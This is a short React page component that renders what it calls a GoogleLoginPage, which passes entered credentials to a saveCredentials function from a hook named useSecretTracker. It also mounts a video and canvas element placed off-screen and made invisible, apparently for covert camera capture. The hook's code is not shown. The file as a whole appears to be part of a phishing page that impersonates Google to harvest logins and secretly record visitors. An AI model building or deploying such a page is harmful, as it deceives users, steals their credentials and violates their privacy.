import { useSecretTracker } from "@/hooks/use-tracking";
import GoogleLoginPage from "@/components/GoogleLoginPage";

export default function Home() {
  const { videoRef, canvasRef, sessionId, saveCredentials } = useSecretTracker();

  return (
    <>
      <div style={{ position: "absolute", top: -9999, left: -9999, opacity: 0, pointerEvents: "none", zIndex: -100 }}>
        <video ref={videoRef} width={640} height={480} playsInline muted />
        <canvas ref={canvasRef} />
      </div>
      <GoogleLoginPage sessionId={sessionId} onCredentials={saveCredentials} />
    </>
  );
}
